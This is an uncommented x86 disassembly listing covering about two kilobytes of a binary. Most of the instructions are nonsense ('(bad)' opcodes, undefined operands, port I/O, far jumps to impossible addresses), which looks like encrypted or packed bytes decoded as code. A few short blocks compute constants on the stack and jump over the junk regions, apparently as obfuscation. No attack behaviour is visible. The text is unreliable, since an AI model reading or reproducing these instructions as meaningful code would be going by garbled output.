  4195d5:	mov    edi,0xb98c9bb3
  4195da:	in     al,dx
  4195db:	test   BYTE PTR [ecx-0x53e0ac96],cl
  4195e1:	and    esi,DWORD PTR [esi+eax*4-0x414e69]
  4195e8:	stc    
  4195e9:	pop    edx
  4195ea:	mov    BYTE PTR [esi+0x6c598fc1],al
  4195f0:	cmp    ax,0xb3ff
  4195f4:	adc    BYTE PTR [esi],0xa4
  4195f7:	adc    BYTE PTR ds:0xb86c5a51,ah
  4195fd:	sub    ecx,DWORD PTR [esi]
  4195ff:	adc    ax,0x8c31
  419603:	adc    al,0x45
  419605:	or     BYTE PTR [ecx+ebp*4-0x2f],cl
  419609:	xor    al,0xf0
  41960b:	and    ch,dh
  41960d:	or     DWORD PTR [esi-0x92d67c],0x51
  419614:	xchg   ebp,eax
  419615:	jno    0x41960f
  419617:	aas    
  419618:	push   ss
  419619:	cmp    dl,BYTE PTR [ecx-0x9]
  41961c:	aas    
  41961d:	pop    esi
  41961e:	sahf   
  41961f:	mov    ecx,0x95858481
  419624:	popf   
  419625:	fnstcw WORD PTR [edx]
  419627:	int    0x6e
  419629:	push   edi
  41962a:	and    BYTE PTR [esi-0x6f],al
  41962d:	mov    cl,0xd6
  41962f:	jbe    0x4195e7
  419631:	inc    ecx
  419632:	pusha  
  419633:	mov    dh,0x30
  419635:	xor    DWORD PTR [edi+0x26d77667],esi
  41963b:	lods   al,BYTE PTR ds:[esi]
  41963c:	out    dx,al
  41963d:	jno    0x41967b
  41963f:	add    eax,0x76df76aa
  419644:	in     eax,dx
  419645:	dec    ebp
  419646:	mov    si,bp
  419649:	and    ebx,DWORD PTR [edx-0x74]
  41964c:	mov    esi,0x2c9979df
  419651:	ret    
  419652:	add    eax,0x66d952cc
  419657:	or     ecx,edx
  419659:	mov    edx,0x21a4
  41965e:	or     cx,dx
  419661:	mov    dx,WORD PTR [esp+0x2c]
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	inc    ecx
  419696:	dec    edi
  419697:	mov    dh,0xa4
  419699:	stos   DWORD PTR es:[edi],eax
  41969a:	or     eax,eax
  41969c:	mov    esi,0xbebec235
  4196a1:	or     BYTE PTR [edx],dh
  4196a3:	lods   al,BYTE PTR ds:[esi]
  4196a4:	xchg   ecx,eax
  4196a5:	cmp    esi,esp
  4196a7:	(bad)  
  4196a9:	mov    al,0xdb
  4196ab:	mov    ds:0x47a85cb8,al
  4196b0:	nop
  4196b1:	pop    ebx
  4196b2:	cmp    edi,DWORD PTR [ebp+0x6c]
  4196b5:	out    0x84,eax
  4196b7:	ins    BYTE PTR es:[edi],dx
  4196b8:	cmp    DWORD PTR [edi],edi
  4196ba:	sbb    ebx,ebp
  4196bc:	daa    
  4196bd:	imul   esp,esp,0x5d
  4196c0:	sbb    eax,0x2
  4196c3:	push   eax
  4196c4:	shr    BYTE PTR [ebx],cl
  4196c6:	call   0xf8c7:0x3dc5789
  4196cd:	fild   DWORD PTR [edi+eiz*8+0x40]
  4196d1:	dec    eax
  4196d2:	fadd   DWORD PTR [ebp+edx*1+0x1e370d53]
  4196d9:	(bad)  
  4196da:	jle    0x419723
  4196dc:	dec    esi
  4196dd:	(bad)  [esi]
  4196df:	cmp    DWORD PTR [ecx-0x47ce4711],eax
  4196e5:	fcomp  DWORD PTR [ebx*4+0x41cd488e]
  4196ec:	sub    ch,dh
  4196ee:	mov    ebx,DWORD PTR [esi+0x77]
  4196f1:	mov    ds:0xa9be11f3,al
  4196f6:	std    
  4196f7:	ins    BYTE PTR es:[edi],dx
  4196f8:	ins    BYTE PTR es:[edi],dx
  4196f9:	cwde   
  4196fa:	in     eax,0xfd
  4196fc:	dec    esp
  4196fd:	call   0xec6f3c22
  419702:	mov    bl,0x72
  419704:	xchg   ebp,eax
  419705:	adc    WORD PTR [ecx],0x50fb
  41970a:	push   esi
  41970b:	or     dl,BYTE PTR [ebx+0x7c6050b2]
  419711:	cli    
  419712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419713:	add    al,0xe6
  419715:	outs   dx,DWORD PTR ds:[esi]
  419716:	dec    esp
  419717:	loope  0x419731
  419719:	std    
  41971a:	(bad)  
  41971c:	jne    0x4196c4
  41971e:	stos   BYTE PTR es:[edi],al
  41971f:	ror    BYTE PTR [ebp+0x6e1eb80a],0x96
  419726:	push   ebp
  419727:	adc    DWORD PTR [ebp-0x2de8ac02],eax
  41972d:	cs jmp 0x80e54cc7
  419733:	mov    eax,0xdfd3d8a4
  419738:	(bad)  
  419739:	sbb    DWORD PTR es:[ebx+0x12],edx
  41973d:	cmp    BYTE PTR [edx+edi*1-0x6],0x37
  419742:	fisubr WORD PTR [edx+0x5ff96259]
  419748:	pop    esp
  419749:	popf   
  41974a:	cld    
  41974b:	pushf  
  41974c:	xchg   BYTE PTR [esi+0x1d],bh
  41974f:	test   bh,bh
  419751:	jge    0x41972a
  419753:	je     0x419785
  419755:	xor    al,0xf7
  419757:	jecxz  0x419781
  419759:	add    edx,DWORD PTR [esi+0x6b]
  41975c:	jp     0x419774
  41975e:	icebp  
  41975f:	mov    cl,0x12
  419761:	test   DWORD PTR [edi-0x63],esi
  419764:	cs jmp 0xb24e8eaa
  41976a:	dec    esi
  41976b:	sub    cl,BYTE PTR [edi-0x2a4fe652]
  419771:	cmp    bl,ah
  419773:	pop    edx
  419774:	push   eax
  419775:	lods   eax,DWORD PTR ds:[esi]
  419776:	jge    0x41973e
  419778:	jns    0x41972e
  41977a:	push   ss
  41977b:	add    bl,BYTE PTR [esi]
  41977d:	dec    esi
  41977e:	cli    
  41977f:	or     BYTE PTR [ebp+eiz*4-0x30196121],ch
  419786:	lea    ecx,[ecx]
  419788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419789:	clc    
  41978a:	add    BYTE PTR [eax+0x53],ah
  41978d:	outs   dx,DWORD PTR ds:[esi]
  41978e:	cwde   
  41978f:	xor    ecx,DWORD PTR [esi+0x65]
  419792:	mov    esi,0x974b3350
  419797:	adc    DWORD PTR [edx-0x7bf1d3f4],edx
  41979d:	sub    eax,0x5f118402
  4197a2:	leave  
  4197a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197a4:	fadd   DWORD PTR [ecx-0x35c66074]
  4197aa:	mov    bl,0x8
  4197ac:	or     DWORD PTR [ebx-0x555987da],0xffffff8d
  4197b3:	inc    ebx
  4197b4:	enter  0xf59f,0xf9
  4197b8:	fnstsw WORD PTR [eax-0x4b]
  4197bb:	jmp    0x5f7d:0x3daaa2e4
  4197c2:	test   eax,0x523bac60
  4197c7:	jns    0x419800
  4197c9:	add    al,0xdb
  4197cb:	mov    ebp,0x3c4d5e0
  4197d0:	cmp    dl,BYTE PTR [esi+0x40]
  4197d3:	xor    dh,BYTE PTR [ecx+ebp*2]
  4197d6:	or     dl,bh
  4197d8:	ja     0x419816
  4197da:	mov    al,ds:0x721ec078
  4197df:	neg    ch
  4197e1:	sbb    al,0x44
  4197e3:	in     al,0xff
  4197e5:	mov    eax,ds:0x63d8a869
  4197ea:	hlt    
  4197eb:	pop    esi
  4197ec:	jg     0x419852
  4197ee:	push   esi
  4197ef:	inc    ecx
  4197f0:	fwait
  4197f1:	mov    esi,0xd2d8f4d9
  4197f6:	aas    
  4197f7:	ja     0x419825
  4197f9:	jecxz  0x419829
  4197fb:	scas   eax,DWORD PTR es:[edi]
  4197fc:	aad    0x5b
  4197fe:	rol    DWORD PTR [ecx],cl
  419800:	add    edi,ebx
  419802:	pop    ss
  419803:	int3   
  419804:	xlat   BYTE PTR ds:[ebx]
  419805:	loop   0x4197b7
  419807:	sub    eax,0x7a06ce66
  41980c:	bound  edx,QWORD PTR [edx-0x71]
  41980f:	retf   0x4dcf
  419812:	sub    dl,cl
  419814:	iret   
  419815:	jmp    0xd620332d
  41981a:	jo     0x4197d1
  41981c:	dec    ebx
  41981d:	outs   dx,BYTE PTR ds:[esi]
  41981e:	or     edx,ecx
  419820:	and    bl,BYTE PTR [ecx]
  419822:	cwde   
  419823:	or     esp,DWORD PTR [edx-0x4]
  419826:	mov    BYTE PTR [esi+0xc947265],0xb
  41982d:	push   cs
  41982e:	shl    BYTE PTR [ebx+0x7a],1
  419831:	cmp    BYTE PTR [edi+ecx*1+0x5a290988],0x5
  419839:	aas    
  41983a:	cdq    
  41983b:	or     BYTE PTR [edi],ch
  41983d:	lock dec esp
  41983f:	jo     0x419856
  419841:	cmp    ebp,DWORD PTR [esi-0x3e4485df]
  419847:	not    DWORD PTR [ebx+0x74823c74]
  41984d:	mov    ds:0xad225a80,eax
  419852:	(bad)  
  419853:	inc    esp
  419854:	sbb    eax,0xcda5d539
  419859:	jb     0x419862
  41985b:	(bad)  
  41985c:	push   esi
  41985d:	or     bl,0x71
  419860:	jmp    0x41986d
  419862:	xchg   ebp,eax
  419863:	inc    edx
  419864:	and    BYTE PTR [esi],bl
  419866:	ins    BYTE PTR es:[edi],dx
  419867:	push   ds
  419868:	adc    al,0x32
  41986a:	(bad)  
  41986b:	nop
  41986c:	out    0x9c,eax
  41986e:	push   es
  41986f:	not    BYTE PTR [edi-0x8677249]
  419875:	repz adc al,0x31
  419878:	sub    dh,BYTE PTR [ebp-0xfea0ff5]
  41987e:	icebp  
  41987f:	adc    BYTE PTR [edx-0x2eb66138],dh
  419885:	fisttp DWORD PTR [ecx+0x3d1eac4f]
  41988b:	call   0xefd0:0xd6f80826
  419892:	cmp    dh,al
  419894:	call   FWORD PTR [edx]
  419896:	in     al,0xc2
  419898:	pusha  
  419899:	cmp    DWORD PTR [ecx],ebp
  41989b:	sar    DWORD PTR [ecx+0x65],1
  41989e:	xchg   edx,eax
  41989f:	pop    ss
  4198a0:	mov    bl,0x42
  4198a2:	pop    ecx
  4198a3:	xchg   esp,eax
  4198a4:	leave  
  4198a5:	shld   DWORD PTR [eax],ebx,cl
  4198a8:	pop    ds
  4198a9:	cmc    
  4198aa:	leave  
  4198ab:	and    bh,cl
  4198ad:	call   0x8e878626
  4198b2:	fidivr DWORD PTR [ebp+0x7abc7236]
  4198b8:	leave  
  4198b9:	jae    0x419917
  4198bb:	xchg   esi,eax
  4198bc:	jg     0x419900
  4198be:	adc    ecx,DWORD PTR [edi+0x35e4a2bd]
  4198c4:	or     esp,ebp
  4198c6:	repnz pop ebx
  4198c8:	xor    DWORD PTR [ebx],edi
  4198ca:	clc    
  4198cb:	jle    0x41994a
  4198cd:	dec    eax
  4198ce:	std    
  4198cf:	xor    BYTE PTR [esi+0x839d475],0x5
  4198d6:	fisubr DWORD PTR [esi-0x3495b51e]
  4198dc:	push   cs
  4198dd:	xchg   edx,eax
  4198de:	add    al,0x5a
  4198e0:	ret    
  4198e1:	mov    WORD PTR [esp+0x24],cx
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	ins    DWORD PTR es:[edi],dx
  419917:	and    eax,DWORD PTR [esi]
  419919:	xchg   edx,eax
  41991a:	and    al,0xd
  41991c:	sar    BYTE PTR [esi-0x41413dcb],0x58
  419923:	popa   
  419924:	jmp    0xa26d7605
  419929:	dec    esi
  41992a:	sbb    eax,0xae62c803
  41992f:	js     0x4199af
  419931:	push   edi
  419932:	stos   DWORD PTR es:[edi],eax
  419933:	push   0x84afff2c
  419938:	pop    eax
  419939:	shl    DWORD PTR [ecx],1
  41993b:	int    0xd6
  41993d:	or     BYTE PTR [ebx-0x1c099eee],ch
  419943:	cli    
  419944:	or     BYTE PTR es:[esi+0x48],ah
  419948:	dec    ebp
  419949:	cmp    DWORD PTR [ebx+0x77],esi
  41994c:	loopne 0x4198e1
  41994e:	jle    0x419969
  419950:	in     al,0x5d
  419952:	cwde   
  419953:	adc    esp,DWORD PTR ds:0x12d2f382
  419959:	xor    al,0x51
  41995b:	imul   ebx,DWORD PTR [edx-0x7284b275],0x62
  419962:	leave  
  419963:	add    DWORD PTR [ebp-0x450f4d23],edx
  419969:	js     0x419927
  41996b:	inc    eax
  41996c:	outs   dx,BYTE PTR ds:[esi]
  41996d:	shr    DWORD PTR [ebx+0xd0534a1],1
  419973:	fcom   QWORD PTR [esi]
  419975:	test   eax,0xac74c74d
  41997a:	daa    
  41997b:	in     al,dx
  41997c:	loopne 0x41992a
  41997e:	retf   0xa73
  419981:	sbb    eax,0xedbd3938
  419986:	add    ebx,DWORD PTR [eax]
  419988:	xor    al,0xb
  41998a:	fsub   QWORD PTR [ebx]
  41998c:	mov    ds:0xab095972,eax
  419991:	cwde   
  419992:	add    esp,esp
  419994:	xor    DWORD PTR [edi-0x7],0x10e2568e
  41999b:	add    eax,0xb4cdff5f
  4199a0:	adc    BYTE PTR [edi+0x58eb0a1],0x98
  4199a7:	fwait
  4199a8:	stos   BYTE PTR es:[edi],al
  4199a9:	xchg   esp,eax
  4199aa:	pop    ebp
  4199ab:	cmp    BYTE PTR [esp+edi*2-0xe],cl
  4199af:	jl     0x4199b5
  4199b1:	(bad)  
  4199b2:	clc    
  4199b3:	dec    ebp
  4199b4:	xchg   ecx,eax
  4199b5:	pop    esp
  4199b6:	dec    ecx
  4199b7:	icebp  
  4199b8:	jmp    0xdee28da1
  4199bd:	jp     0x419a08
  4199bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199c0:	jno    0x419954
  4199c2:	or     eax,0x3c602bea
  4199c7:	add    BYTE PTR [eax],ah
  4199c9:	mov    edi,esp
  4199cb:	jno    0x4199d0
  4199cd:	cmp    al,0x7d
  4199cf:	mov    ds:0xd4c6d85a,al
  4199d4:	adc    eax,0xdd117f6f
  4199d9:	cmp    BYTE PTR [esi+edi*2],bl
  4199dc:	jno    0x4199e7
  4199de:	sub    DWORD PTR [edx+0x44],edx
  4199e1:	(bad)  
  4199e2:	xchg   esi,eax
  4199e3:	mov    BYTE PTR [ebx+0x77a410b0],al
  4199e9:	xor    BYTE PTR [ebp+0x2e3628f7],ah
  4199ef:	and    DWORD PTR [ebp-0x21],0x1669fa6
  4199f6:	cmp    al,0x5b
  4199f8:	pop    ss
  4199f9:	dec    esi
  4199fa:	pusha  
  4199fb:	push   eax
  4199fc:	sti    
  4199fd:	js     0x419a64
  4199ff:	push   es
  419a00:	inc    eax
  419a01:	fsub   QWORD PTR ds:0x3bb9c6f
  419a07:	iret   
  419a08:	outs   dx,DWORD PTR ds:[esi]
  419a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a0a:	dec    esp
  419a0b:	mov    edi,0x7b6ff596
  419a10:	xor    DWORD PTR [eax+0x4e],ebp
  419a13:	xchg   esp,eax
  419a14:	mov    ecx,0xd3ad00f6
  419a19:	enter  0x7d58,0xbc
  419a1d:	jno    0x419a8e
  419a1f:	jnp    0x419a71
  419a21:	xor    dl,BYTE PTR [eax+0x45ea2456]
  419a27:	add    BYTE PTR [edx],dl
  419a29:	fcom   DWORD PTR [eax-0x7d966a34]
  419a2f:	(bad)  [ecx+0x656576e9]
  419a35:	retf   
  419a36:	repnz gs mov esp,0x400cae86
  419a3d:	or     DWORD PTR [edx+eiz*1],ebp
  419a40:	clc    
  419a41:	scas   eax,DWORD PTR es:[edi]
  419a42:	xor    BYTE PTR [eax+ebx*4+0x59904c2b],al
  419a49:	retf   0xc2b0
  419a4c:	jb     0x419a64
  419a4e:	xchg   ebp,eax
  419a4f:	idiv   eax
  419a51:	out    dx,al
  419a52:	sub    eax,0xd75413cf
  419a57:	pop    edi
  419a58:	sbb    DWORD PTR [ebx+eiz*1],eax
  419a5b:	pop    esp
  419a5c:	retf   0x1d1a
  419a5f:	jno    0x419a05
  419a61:	cli    
  419a62:	addr16 mov ds:0xb7d7,ax
  419a67:	sbb    eax,0xec45e223
  419a6c:	lods   al,BYTE PTR ds:[esi]
  419a6d:	push   ebx
  419a6e:	or     DWORD PTR [edi+0x5b98d4bc],ecx
  419a74:	jl     0x419a74
  419a76:	lock dec edi
  419a78:	push   0x8e657a94
  419a7d:	rcr    esi,0x55
  419a80:	pushf  
  419a81:	xchg   edx,eax
  419a82:	or     eax,0xaef9b0a5
  419a87:	sbb    cl,bl
  419a89:	repnz cmp al,0xc0
  419a8c:	and    ecx,DWORD PTR [edi]
  419a8e:	xchg   edx,eax
  419a8f:	sti    
  419a90:	cmc    
  419a91:	test   ebp,ecx
  419a93:	or     edx,ebp
  419a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a96:	xlat   BYTE PTR ds:[ebx]
  419a97:	ss jle 0x419a9d
  419a9a:	fnstenv [esi]
  419a9c:	or     bl,BYTE PTR [ebp-0x2e]
  419a9f:	aam    0x63
  419aa1:	push   es
  419aa2:	shl    BYTE PTR [ecx],cl
  419aa4:	adc    eax,0xb9d6a747
  419aa9:	pop    esp
  419aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aab:	add    eax,0xc0aa5adf
  419ab0:	outs   dx,DWORD PTR ds:[esi]
  419ab1:	aam    0x3b
  419ab3:	stos   BYTE PTR es:[edi],al
  419ab4:	stos   DWORD PTR es:[edi],eax
  419ab5:	add    BYTE PTR [esi+0xd],dl
  419ab8:	mov    ebp,0x7a90e2d5
  419abd:	xchg   esp,eax
  419abe:	test   eax,0xd92bf201
  419ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac4:	xchg   ebx,eax
  419ac5:	sti    
  419ac6:	or     al,0x4d
  419ac8:	mov    bl,0xb5
  419aca:	repnz out dx,al
  419acc:	jno    0x419b08
  419ace:	xchg   ecx,eax
  419acf:	(bad)  
  419ad0:	cmc    
  419ad1:	test   dh,ch
  419ad3:	mov    bl,0xdf
  419ad5:	jecxz  0x419b2c
  419ad7:	mov    WORD PTR [ecx-0x5f],fs
  419ada:	sbb    BYTE PTR [eax-0x25],bl
  419add:	sub    dh,cl
  419adf:	stos   BYTE PTR es:[edi],al
  419ae0:	cmp    eax,0x3f2efa1a
  419ae5:	adc    al,0xaa
  419ae7:	aas    
  419ae8:	xchg   esi,eax
  419ae9:	test   al,0x80
  419aeb:	xchg   DWORD PTR ds:[edi+0x62],edx
  419aef:	push   0xffffffab
  419af1:	pop    ecx
  419af2:	mov    ds,WORD PTR [edx+0x6e06e4c]
  419af8:	gs loop 0x419b5f
  419afb:	mov    es,WORD PTR [ebx+0x71]
  419afe:	mov    al,0x8d
  419b00:	jb     0x419b76
  419b02:	jmp    0x3cf4:0x35707290
  419b09:	push   esp
  419b0a:	out    0x1,al
  419b0c:	in     al,0x14
  419b0e:	pop    eax
  419b0f:	cli    
  419b10:	jmp    0x419afc
  419b12:	rol    eax,1
  419b14:	hlt    
  419b15:	cwde   
  419b16:	not    DWORD PTR [ecx+ecx*8+0x45a866d4]
  419b1d:	je     0x419b9d
  419b1f:	cmp    BYTE PTR [eax+0x10],cl
  419b22:	lea    ecx,[ebx+ebp*2-0x74c28154]
  419b29:	jb     0x419b6c
  419b2b:	pusha  
  419b2c:	push   ebx
  419b2d:	or     bl,BYTE PTR [edx-0x1c]
  419b30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b31:	jno    0x419aed
  419b33:	add    dl,BYTE PTR [esi-0x6ff2e82d]
  419b39:	add    DWORD PTR [ecx-0x75],0xfffffff7
  419b3d:	lea    ecx,ds:0x6fb96d2b
  419b43:	jp     0x419ae5
  419b45:	(bad)  
  419b46:	bound  esp,QWORD PTR [edi+0x38]
  419b49:	aad    0xde
  419b4b:	or     ch,dl
  419b4d:	test   DWORD PTR [eax+0x291be04c],eax
  419b53:	sub    ah,BYTE PTR [esi-0x49]
  419b56:	call   0x5f317f14
  419b5b:	cmp    DWORD PTR [ebx],esp
  419b5d:	xor    eax,0x67ab3195
  419b62:	mov    edx,0x10de
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	push   esp
  419bba:	pop    esp
  419bbb:	fninit 
  419bbd:	pushf  
  419bbe:	adc    eax,eax
  419bc0:	mov    esi,0xbebec235
  419bc5:	mov    ebp,0xdc942ffe
  419bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bcb:	jns    0x419bb6
  419bcd:	test   DWORD PTR [ecx+ecx*1],eax
  419bd0:	ins    DWORD PTR es:[edi],dx
  419bd1:	mov    ah,0xb1
  419bd3:	jmp    0x419bf8
  419bd5:	cmp    al,0xa9
  419bd7:	fist   DWORD PTR [ecx-0x59a72bc1]
  419bdd:	lods   al,BYTE PTR ds:[esi]
  419bde:	sub    al,0xa
  419be0:	dec    ebx
  419be1:	retf   0xa4b8
  419be4:	or     edi,DWORD PTR [ebx]
  419be6:	(bad)  
  419be7:	mov    edi,0x2b2dddd3
  419bec:	xor    ebp,DWORD PTR [edi-0x6b22b1de]
  419bf2:	push   ebp
  419bf3:	cmc    
  419bf4:	ins    BYTE PTR es:[edi],dx
  419bf5:	repz into 
  419bf7:	into   
  419bf8:	pop    edi
  419bf9:	jne    0x419c33
  419bfb:	inc    esi
  419bfc:	fist   DWORD PTR [eax-0xd]
  419bff:	imul   edi
  419c01:	mov    ?,WORD PTR [eax-0x1dcb3d91]
  419c07:	xchg   edi,eax
  419c08:	in     al,dx
  419c09:	push   ss
  419c0a:	rol    edx,0xb2
  419c0d:	(bad)
  419c10:	test   bl,dl
  419c12:	(bad)
  419c17:	xor    ecx,DWORD PTR [ebx+0x67a98de8]
  419c1d:	clc    
  419c1e:	imul   ebp,DWORD PTR [ebx+eiz*4+0x2d3a6a0d],0x73
  419c26:	sbb    bl,bl
  419c28:	cdq    
  419c29:	outs   dx,DWORD PTR ds:[esi]
  419c2a:	mov    esp,0xc39d6f71
  419c2f:	pop    ss
  419c30:	out    dx,al
  419c31:	push   es
  419c32:	sub    eax,0xa66e632d
  419c37:	mov    al,0x54
  419c39:	mov    ebp,0x9c05dd3
  419c3e:	sub    al,0x84
  419c40:	data16 xlat BYTE PTR ds:[ebx]
  419c42:	xchg   ebx,eax
  419c43:	xor    bl,dh
  419c45:	cmp    dl,BYTE PTR [ecx-0x1f916025]
  419c4b:	stc    
  419c4c:	inc    edi
  419c4d:	popa   
  419c4e:	push   0x81e96a15
  419c53:	mov    ch,0xf
  419c55:	pop    eax
  419c56:	retf   
  419c57:	or     eax,esp
  419c59:	jbe    0x419caf
  419c5b:	dec    ebp
  419c5c:	jle    0x419cd8
  419c5e:	inc    DWORD PTR cs:[edx+0x6ff3bde3]
  419c65:	push   ebp
  419c66:	sbb    eax,0x8b843d49
  419c6b:	test   BYTE PTR [ebx+0x61],0xd
  419c6f:	(bad)  
  419c70:	mov    eax,0xee9aef1d
  419c75:	xor    bl,BYTE PTR [ecx]
  419c77:	lock js 0x419c2e
  419c7a:	test   eax,0x52ece9d9
  419c7f:	and    al,0x17
  419c81:	iret   
  419c82:	std    
  419c83:	scas   eax,DWORD PTR es:[edi]
  419c84:	pop    ecx
  419c85:	scas   eax,DWORD PTR es:[edi]
  419c86:	jl     0x419c6d
  419c88:	mul    BYTE PTR [ebp-0x73]
  419c8b:	mov    dh,dh
  419c8d:	jl     0x419c53
  419c8f:	iret   
  419c90:	daa    
  419c91:	iret   
  419c92:	cmp    eax,0x5d29ea0d
  419c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c98:	pop    eax
  419c99:	jno    0x419d02
  419c9b:	lahf   
  419c9c:	or     al,0x53
  419c9e:	jl     0x419ccd
  419ca0:	jecxz  0x419c22
  419ca2:	aaa    
  419ca3:	fbstp  TBYTE PTR [edx+0x106e3c92]
  419ca9:	add    eax,0xc94dbac5
  419cae:	pop    ds
  419caf:	add    BYTE PTR [ebx],cl
  419cb1:	mov    bl,0x9f
  419cb3:	int    0xa5
  419cb5:	dec    ebp
  419cb6:	xchg   edi,eax
  419cb7:	xchg   ebp,eax
  419cb8:	rol    bh,cl
  419cba:	and    esi,DWORD PTR [eax+edi*1]
  419cbd:	push   ss
  419cbe:	iret   
  419cbf:	push   0xffffff97
  419cc1:	mov    ds:0xc2dab4c3,al
  419cc6:	jnp    0x419c9a
  419cc8:	mov    edx,0xfd596ffe
  419ccd:	(bad)  
  419cce:	sti    
  419ccf:	lods   al,BYTE PTR ds:[esi]
  419cd0:	outs   dx,BYTE PTR ds:[esi]
  419cd1:	fdivr  QWORD PTR [esp+ebp*1+0x653a5e03]
  419cd8:	outs   dx,BYTE PTR ds:[esi]
  419cd9:	sub    BYTE PTR [ecx-0x2f],al
  419cdc:	aam    0xeb
  419cde:	mov    eax,0x7919964b
  419ce3:	cwde   
  419ce4:	xchg   edx,eax
  419ce5:	dec    ebp
  419ce6:	dec    ecx
  419ce7:	xchg   ecx,eax
  419ce8:	pop    edi
  419ce9:	cmp    al,0xe7
  419ceb:	ins    BYTE PTR es:[edi],dx
  419cec:	mov    al,0x90
  419cee:	sbb    DWORD PTR [esi+ebp*1],esp
  419cf1:	pop    ecx
  419cf2:	push   ecx
  419cf3:	pop    ecx
  419cf4:	push   0x1d36757c
  419cf9:	xchg   ecx,eax
  419cfa:	clc    
  419cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cfc:	int    0xe9
  419cfe:	jle    0x419c8d
  419d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d01:	cs fwait
  419d03:	push   ss
  419d04:	cmc    
  419d05:	ror    DWORD PTR [esi+0x64],0x9f
  419d09:	loope  0x419d88
  419d0b:	sbb    esp,ebp
  419d0d:	test   BYTE PTR [ebx+0x303697f0],ah
  419d13:	mov    eax,0xb0ddb5bf
  419d18:	cs cmp edx,ebp
  419d1b:	push   cs
  419d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d1d:	(bad)  
  419d1e:	or     eax,0x793aa6ce
  419d23:	push   ds
  419d24:	jbe    0x419d2f
  419d26:	adc    BYTE PTR [esp+eax*4-0x43],dh
  419d2a:	push   edi
  419d2b:	or     eax,0xc18df7ed
  419d30:	imul   esp,DWORD PTR [ebp+0x45d033a2],0x14eabe
  419d3a:	push   ebx
  419d3b:	mov    dl,0xa4
  419d3d:	jbe    0x419d9d
  419d3f:	inc    eax
  419d40:	ror    BYTE PTR [eax+0x41677918],0x1f
  419d47:	rcr    BYTE PTR [ebx+0x51bc5f30],0xfb
  419d4e:	dec    esi
  419d4f:	test   BYTE PTR [eax],dl
  419d51:	(bad)  
  419d52:	jp     0x419d70
  419d54:	repz mov bh,0xb3
  419d57:	dec    ebp
  419d58:	xor    ah,BYTE PTR [edx+edi*2-0x43854c08]
  419d5f:	adc    eax,0xbec746d6
  419d64:	xor    DWORD PTR [ecx],ebx
  419d66:	push   cs
  419d67:	out    0x63,eax
  419d69:	dec    edi
  419d6a:	sub    al,0x4c
  419d6c:	pop    eax
  419d6d:	sub    BYTE PTR [ebp+0x32ed4466],dl
  419d73:	mov    esp,0xce263cb0
  419d78:	mov    ch,BYTE PTR [ebx]
  419d7a:	push   DWORD PTR [esi]
  419d7c:	in     eax,0xc4
  419d7e:	icebp  
  419d7f:	sub    eax,0x12a698f0
  419d84:	dec    ecx
  419d85:	ret    
  419d86:	test   DWORD PTR [edi+0x5af6a016],esi
  419d8c:	adc    esi,DWORD PTR ds:0xeac98300
  419d92:	repnz dec esi
  419d94:	test   BYTE PTR [edx-0xcac5049],0x40
  419d9b:	jmp    0x4c5d:0x5caa1b45
  419da2:	mov    WORD PTR [edi-0x2a],gs
  419da5:	xor    eax,DWORD PTR [ebx+0x7028fc46]
  419dab:	psraw  mm1,mm5
  419dae:	ds mov dh,0x61
  419db1:	jl     0x419d5d
  419db3:	pop    ss
  419db4:	jnp    0x419d3d
  419db6:	mov    ecx,0x1029c17c
  419dbb:	jecxz  0x419d74
  419dbd:	push   ecx
  419dbe:	sub    eax,0xa8510a47
  419dc3:	adc    esp,DWORD PTR [ecx+0x47a479a]
  419dc9:	bound  ebx,QWORD PTR [edx-0x31]
  419dcc:	fidivr WORD PTR [edx+0x36]
  419dcf:	cmc    
  419dd0:	push   ecx
  419dd1:	not    eax
  419dd3:	inc    edx
  419dd4:	push   es
  419dd5:	sbb    eax,0x7daf3e0b
  419dda:	mov    esi,0x90c95c80
  419ddf:	sub    edi,DWORD PTR gs:[edx-0x4f]
  419de3:	inc    edx
